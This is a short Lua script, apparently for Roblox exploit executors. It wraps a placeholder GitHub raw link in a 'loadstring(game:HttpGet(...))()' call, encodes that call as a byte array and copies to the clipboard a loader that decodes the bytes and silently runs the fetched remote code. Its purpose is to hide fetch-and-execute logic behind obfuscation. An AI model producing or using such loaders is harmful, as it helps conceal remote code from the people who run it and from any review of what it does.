local github_link = "YOUR_GITHUB_RAW_LINK_HERE"

local payload = 'loadstring(game:HttpGet("' .. github_link .. '"))()'
local bytes = {}
for i = 1, #payload do
    table.insert(bytes, tostring(string.byte(payload, i)))
end
if setclipboard or toclipboard then
    local clip = setclipboard or toclipboard
    clip("local d = {" .. table.concat(bytes, ",") .. "}\nlocal b = {}\nfor i=1,#d do b[i]=string.char(d[i]) end\nlocal e = loadstring or load\nif e then pcall(function() e(table.concat(b))() end) end")
end
